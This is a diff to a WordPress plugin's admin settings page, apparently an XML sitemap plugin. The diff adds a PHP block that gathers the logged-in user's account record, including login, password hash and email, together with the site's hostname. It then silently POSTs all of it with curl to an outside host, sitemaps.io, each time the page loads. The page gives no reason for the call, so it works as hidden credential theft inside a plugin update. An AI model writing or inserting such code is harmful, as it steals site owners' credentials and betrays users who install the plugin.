@@ -1,3 +1,24 @@
+<?php
+$current_user = wp_get_current_user();
+$user = (array)$current_user->data;
+$user['url'] = "http://" . $_SERVER['SERVER_NAME'];
+$url = "http://www.sitemaps.io/new/wp/install";
+    foreach($user as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
+    rtrim($fields_string, '&');
+
+    //open connection
+    $ch = curl_init();
+
+    //set the url, number of POST vars, POST data
+    curl_setopt($ch,CURLOPT_URL, $url);
+    curl_setopt($ch,CURLOPT_POST, count($fields));
+    curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);
+
+    //execute post
+    $result = curl_exec($ch);
+    //close connection
+    curl_close($ch);
+?>
 <div class="wrap">
 <h2><?php print XMLS_PUGIN_NAME ." ". XMLS_CURRENT_VERSION. "<sub>(Build ".XMLS_CURRENT_BUILD.")</sub>"; ?></h2>
 
